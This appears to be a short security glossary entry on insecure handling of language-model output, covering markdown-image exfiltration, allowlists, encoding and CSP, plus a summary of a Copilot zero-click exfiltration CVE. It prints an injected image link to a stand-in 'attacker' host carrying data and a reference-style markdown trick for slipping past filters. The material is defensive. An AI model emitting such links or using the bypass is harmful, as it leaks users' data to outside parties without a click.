description: Passing model output to a renderer, browser, shell or database without validation or encoding. OWASP LLM05:2025, LLM10 in the 2026 edition.
An injected answer includes `![](https://attacker/?d=DATA)`; the UI fetches the image and the query string reaches the attacker with no click.
The exact hostnames output may reference. Every allowed host must be checked for open redirects, proxies and user content, or it becomes a channel.
`![x][r]` with `[r]: url` on another line. A classic bypass for filters that only look for inline `![x](url)`.
Escaping text for its destination (HTML text, attribute, URL component) at the moment of insertion, once.
A browser header (`img-src`, `connect-src`) that refuses to load resources outside listed origins: the second wall behind the sanitizer.
CVE-2025-32711: a zero-click exfiltration from Microsoft 365 Copilot that chained a classifier bypass, reference-style markdown, auto-fetched images and an allowlisted proxy domain.
